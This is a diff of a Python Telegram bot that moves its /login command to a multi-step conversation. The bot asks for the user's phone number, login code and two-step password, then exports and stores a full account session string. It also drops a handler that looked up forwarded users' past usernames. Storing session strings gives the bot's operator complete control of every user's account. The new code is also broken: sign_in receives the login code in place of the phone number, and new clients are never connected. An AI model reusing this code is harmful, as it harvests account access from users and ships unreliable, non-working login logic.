@@ -6,7 +6,7 @@ import string
 from telegram import Update
 from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application
 from telegram.ext import filters
-from pyrogram import Client, filters as pyrogram_filters
+from pyrogram import Client
 from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
 from telethon.errors import SessionPasswordNeededError  # Correct import for session password error
 from config import API_ID, API_HASH, BOT_TOKEN  # Import credentials from config.py
@@ -56,59 +56,82 @@ async def clear_db(client, message):
     else:
         await message.reply("⚠️ You are not logged in, no session data found.")
 
-# Define the /login command
-@app.on_message(pyrogram_filters.command("login"))
-async def generate_session(_, message):
-    user_id = message.chat.id
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
-    phone_number = number.text
-    try:
-        await message.reply("📲 Sending OTP...")
-        client = Client(f"session_{user_id}", API_ID, API_HASH)
-        
-        await client.connect()
-    except Exception as e:
-        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
+# Define the /login command (using pyrogram Client)
+async def generate_session(update: Update, context: CallbackContext) -> int:
+    user_id = update.message.chat.id
+    context.user_data['user_id'] = user_id  # Store user_id in user_data to track login
+
+    # Ask user for phone number
+    await update.message.reply("Please enter your phone number along with the country code (e.g., +19876543210).")
+    return 1  # Transition to the next state (state 1)
+
+# Handle phone number input
+async def phone_number(update: Update, context: CallbackContext) -> int:
+    user_id = context.user_data['user_id']
+    phone_number = update.message.text
+
+    # Create pyrogram client for login
+    client = Client(f"session_{user_id}", API_ID, API_HASH)
     
     try:
+        await update.message.reply("📲 Sending OTP...")
+        await client.connect()
         code = await client.send_code(phone_number)
-    except ApiIdInvalid:
-        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
-        return
-    except PhoneNumberInvalid:
-        await message.reply('❌ Invalid phone number. Please restart the session.')
-        return
+    except (ApiIdInvalid, PhoneNumberInvalid) as e:
+        await update.message.reply(f"❌ Error: {e}")
+        return ConversationHandler.END
+
+    # Ask user for OTP
+    await update.message.reply("Please enter the OTP sent to your Telegram account.")
+    context.user_data['phone_code_hash'] = code.phone_code_hash  # Store phone_code_hash for verification
+    return 2  # Transition to the next state (state 2)
+
+# Handle OTP input
+async def otp_code(update: Update, context: CallbackContext) -> int:
+    user_id = context.user_data['user_id']
+    phone_code = update.message.text.replace(" ", "")
+    phone_code_hash = context.user_data['phone_code_hash']
+
+    client = Client(f"session_{user_id}", API_ID, API_HASH)
+    
     try:
-        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
-    except TimeoutError:
-        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
-        return
-    phone_code = otp_code.text.replace(" ", "")
-    try:
-        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-                
-    except PhoneCodeInvalid:
-        await message.reply('❌ Invalid OTP. Please restart the session.')
-        return
-    except PhoneCodeExpired:
-        await message.reply('❌ Expired OTP. Please restart the session.')
-        return
+        await client.sign_in(update.message.text, phone_code_hash, phone_code)
+    except (PhoneCodeInvalid, PhoneCodeExpired) as e:
+        await update.message.reply(f"❌ OTP Error: {e}")
+        return ConversationHandler.END
     except SessionPasswordNeededError:
-        try:
-            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
-        except TimeoutError:
-            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
-            return
-        try:
-            password = two_step_msg.text
-            await client.check_password(password=password)
-        except PasswordHashInvalid:
-            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
-            return
+        # Ask for password if 2FA is enabled
+        await update.message.reply("Your account has two-step verification enabled. Please enter your password.")
+        return 3  # Transition to password state
+
+    # If login successful, save the session string
     string_session = await client.export_session_string()
-    save_session_string(user_id, string_session)  # Save session string locally
+    save_session_string(user_id, string_session)
     await client.disconnect()
-    await otp_code.reply("✅ Login successful!")
+    
+    await update.message.reply("✅ Login successful!")
+    return ConversationHandler.END  # End conversation
+
+# Handle password input for two-step verification
+async def password_input(update: Update, context: CallbackContext) -> int:
+    user_id = context.user_data['user_id']
+    password = update.message.text
+
+    client = Client(f"session_{user_id}", API_ID, API_HASH)
+    
+    try:
+        await client.check_password(password=password)
+    except Exception as e:
+        await update.message.reply(f"❌ Invalid password: {e}")
+        return ConversationHandler.END
+    
+    # If password is correct, export the session string
+    string_session = await client.export_session_string()
+    save_session_string(user_id, string_session)
+    await client.disconnect()
+    
+    await update.message.reply("✅ Login successful with two-step verification!")
+    return ConversationHandler.END  # End conversation
 
 # Define the start and help commands for the bot
 def start(update: Update, context: CallbackContext) -> None:
@@ -132,34 +155,9 @@ def help_command(update: Update, context: CallbackContext) -> None:
         "/help - Show this message"
     )
 
-# Handle forwarded messages and retrieve username history
-def handle_forwarded_message(update: Update, context: CallbackContext) -> None:
-    # Check if the user is logged in
-    if not user_logged_in:
-        update.message.reply_text(
-            "🚫 Pehle login karein! 🔑\n\n"
-            "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
-            "Uske baad hi main aapki madad kar sakta hoon. 😊"
-        )
-        return
-
-    # If message is forwarded, extract sender's info
-    if update.message.forward_from:
-        forwarded_user = update.message.forward_from
-        sender_id = forwarded_user.id
-        sender_username = forwarded_user.username if forwarded_user.username else "No username"
-
-        # Check if the sender's history is available
-        history = user_history.get(sender_id, None)
-
-        if history:
-            update.message.reply_text(f"User {sender_username} has previously logged in with the username: {history}")
-        else:
-            update.message.reply_text(f"User {sender_username} does not have a previous login history.")
-
 # Unauthorized message handler (before login)
 def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
-    if not user_logged_in:
+    if 'user_id' not in context.user_data:
         update.message.reply_text(
             "🚫 Aapko pehle login karna hoga! 🔑\n\n"
             "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
@@ -179,9 +177,11 @@ def conversation_handler() -> ConversationHandler:
     return ConversationHandler(
         entry_points=[CommandHandler('login', generate_session)],  # /login command triggers this conversation
         states={
-            'PHONE': [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number)],
+            1: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number)],  # Step 1: phone number
+            2: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_code)],  # Step 2: OTP
+            3: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_input)],  # Step 3: Password (if 2FA)
         },
-        fallbacks=[],
+        fallbacks=[CommandHandler('help', help_command)],
     )
 
 # Main function to run the bot
@@ -202,11 +202,8 @@ def main():
     # Handle messages that are not commands
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unauthorized_messages))
 
-    # Handle forwarded messages to track username history
-    application.add_handler(MessageHandler(filters.FORWARDED, handle_forwarded_message))
-
     # Start Bot Polling
     application.run_polling()
 
 if __name__ == "__main__":
-    main()  # Ensure this function call is properly indented and closed
+    main()  # Ensure this function call is properly indented
